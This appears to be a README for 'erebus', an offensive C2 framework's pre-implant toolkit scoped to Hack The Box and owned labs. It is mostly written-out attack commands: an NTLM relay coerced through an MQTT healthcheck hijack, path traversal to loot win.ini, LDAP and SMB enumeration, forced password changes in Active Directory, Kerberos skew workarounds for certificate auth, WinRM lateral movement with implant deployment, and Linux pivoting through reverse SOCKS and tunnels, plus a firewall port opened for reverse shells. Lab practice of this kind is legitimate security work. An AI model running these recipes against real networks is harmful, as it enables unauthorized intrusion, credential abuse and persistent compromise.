# Operator pre-implant toolkit (lab)

Authorized **HTB / owned lab** helpers that run **without** a C2 session or teamserver.

**Inbound C2 / firewall / auth logs / reverse tunnel:** `erebus inbound` · `docs/OPERATOR_INBOUND.md`.

| Command | Purpose |
| --- | --- |
| `erebus inbound …` | tun0 / listeners / SOCKS env / SSH reverse tunnel |
| `erebus ldap …` | Host-side LDAPS bind / enum / dangling ADCS template names |
| `erebus smb …` | Host-side SMB shares / ls / get (no implant) |
| `erebus ad password …` | ForceChangePassword via LDAPS `unicodePwd` |
| `erebus mqtt …` | MQTT subscribe / publish / healthcheck URL hijack |
| `erebus relay http …` | HTTP NTLM capture → relay to target → held session GET (LFI) |

Also available as operator REPL commands `ldap` / `host-smb` / `ad` / `mqtt` / `relay` (same code path). Implant `smb` / `ldap-enum` still need `use <session>`.

## Unprivileged ports (rootless)

Default: **refuse listen ports &lt; 1024**.

```bash
# Good
erebus relay http start --listen 10.10.14.15:8888 --target http://app.lab.htb/

# Override (needs CAP_NET_BIND_SERVICE / root)
EREBUS_ALLOW_PRIV_PORTS=1 erebus relay http start --listen 0.0.0.0:80 --target http://app.lab.htb/ --allow-priv-ports
```

Many HTB coerces (WebDAV `@port`, PowerShell) work on **high HTTP ports**. Classic SMB coerce still wants **445** — use sudo or pivot.

## Fedora firewalld

Inbound from HTB VPN to your `tun0` high ports may be blocked:

```bash
firewall-cmd --add-port=8888/tcp
firewall-cmd --add-port=4444/tcp   # reverse shells
# or trust the tunnel interface (careful):
# firewall-cmd --zone=trusted --add-interface=tun0
```

## Ghostlink-style recipe

```bash
# Terminal A — NTLM relay (sticky TCP + held session for LFI)
erebus relay http start \
  --listen 10.10.14.15:8888 \
  --target http://gpz-op26-secure.ghostlink.htb/ \
  --kernel-auth

# Terminal B — coerce via MQTT healthcheck
erebus mqtt healthcheck-hijack --host 10.129.x.x \
  --topic GhostProtocolZero/systems/node/secureshare/healthcheck \
  --url http://10.10.14.15:8888

# After SUCCEED log line:
erebus relay http sessions
erebus relay http get --session 1 --double-encode \
  --path '..\..\..\..\..\..\..\windows\win.ini' \
  --out loot/win.ini
```

**Relay hardening (post code-review):**
- Sticky single TCP connection for Type1→Type3→subsequent GETs (connection-oriented NTLM)
- Control API defaults to **127.0.0.1 only**; refuse `0.0.0.0` unless `--api-allow-remote`
- Stale `~/.erebus/relay/control.json` cleared on stop / dead PID
- Authorization never forwarded on redirects
- Double-encode matches Python `quote(quote(path, safe=""), safe="")` (dots + backslashes)

**Hosts:** map internal vhosts to the DC IP in `/etc/hosts` (or bwrap/docker `--add-host`).

**Clock skew:** Ghostlink DC was ~8h ahead; DanglingTree +7h.

```bash
erebus kerberos skew --dc 10.129.x.x
erebus kerberos with-skew --dc 10.129.x.x -- certipy auth -pfx administrator.pfx -dc-ip 10.129.x.x
```

`with-skew` needs libfaketime (`EREBUS_FAKETIME_SO` or `/usr/lib64/libfaketime.so.1`).

## Host-side AD (no implant)

DanglingTree-class boxes often have creds long before WinRM/RDP. Prefer files for secrets (`--pass-file`).

```bash
erebus ldap bind --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass
erebus ldap enum --dc 10.129.x.x --domain danglingtree.htb --user noah.b --pass-file ./noah.pass --type interesting
erebus ldap dangling --dc 10.129.x.x --domain danglingtree.htb --user jake.h --pass-file ./jake.pass

erebus smb shares --host 10.129.x.x --anon
erebus smb get --host 10.129.x.x --share IT --path DanglingTree_RoE_Assessment.pdf --out roe.pdf

# ForceChangePassword (do not put the sAM prefix in the new password)
erebus ad password --dc 10.129.x.x --domain danglingtree.htb \
  --user alex.o --pass-file ./alex.pass --target jake.h --new-pass-file ./jake.new --yes
```

LDAPS is tried first so DCs that return `strongerAuthRequired` on unsigned 389 still work.

## Soft path after domain user

Once you have `nvirelli` / Admin (or similar):

```bash
erebus op lateral winrm <IP> "whoami" --user U --domain D --pass-file ./pass.txt
# or --hash <NT>
python3 scripts/deploy_winrm.py --host <IP> --user U --domain D --pass-file ./pass.txt --implant build/implant.exe
```

Prefer soft compromise; skip LSASS unless the objective requires it.

## Linux pivot (C implant first)

After a Linux foothold (e.g. Gogs RCE / web RCE):

1. **Prefer C Linux implant** (`make implant-c-linux` + CA pin).
2. If the host cannot reach operator VPN: `erebus inbound tunnel user@TARGET` and `CALLBACK_URL=https://127.0.0.1:8443`.
3. Exercise shell / file / process from the C session (product QA).
4. **Pivot:** C reverse SOCKS (`socks start`) is implemented — lab-prove on session (M4c live). Fallback: reverse tunnel / Ligolo / Go with justification.
5. External chisel is fine for speed; document intended path as **C implant** for framework QA.

See `docs/plans/SPRINT_L_C_LINUX.md` and `docs/C_IMPLANT_LAB_CHECKLIST.md` §6.

## Security

Lab-only offensive helpers. See `SECURITY.md`. Do not point listeners at unauthorized networks.
